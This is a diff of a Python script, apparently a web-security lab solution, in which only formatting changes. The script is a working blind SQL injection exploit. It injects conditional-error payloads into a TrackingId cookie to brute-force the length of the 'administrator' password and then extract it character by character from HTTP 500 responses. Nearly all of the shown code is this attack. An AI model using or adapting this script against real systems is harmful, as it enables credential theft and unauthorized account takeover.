@@ -8,9 +8,9 @@ import getopt
 
 def clear_screen():
   if os.name == 'posix':
-    clear_window = os.system('clear')
+    os.system('clear')
   else:
-    clear_window = os.system('cls')
+    os.system('cls')
 
 
 def get_password_length(url, trackingId, session):
@@ -21,10 +21,10 @@ def get_password_length(url, trackingId, session):
     payload = f"' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND LENGTH(password) > {i}) ||'"
     payload = urllib.parse.quote_plus(payload)
     cookies = {
-      "TrackingId":trackingId + payload,
-      "session":session
+      "TrackingId" :trackingId + payload,
+      "session" :session
       }
-    r = requests.get(url, cookies = cookies)
+    r = requests.get(url, cookies=cookies)
 
     if r.status_code == 200:
       clear_screen()
@@ -44,21 +44,21 @@ def get_password(password_length, url, trackingId, session):
   password = ""
   message = "[-] The password for 'administrator' is: "
   clear_screen()
-  print(message, end = '', flush = True)
+  print(message, end='', flush=True)
 
   for i in range(password_length):
     for x in characters:
       payload = f"' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND SUBSTR(password, {i + 1}, 1) = '{x}') ||'"
       payload = urllib.parse.quote_plus(payload)
       cookies = {
-        "TrackingId":trackingId + payload,
-        "session":session
+        "TrackingId": trackingId + payload,
+        "session": session
         }
-      r = requests.get(url, cookies = cookies)
+      r = requests.get(url, cookies=cookies)
 
       if r.status_code == 500:
         password += x
-        print(x, end = '', flush = True)
+        print(x, end='', flush=True)
         break
 
   clear_screen()
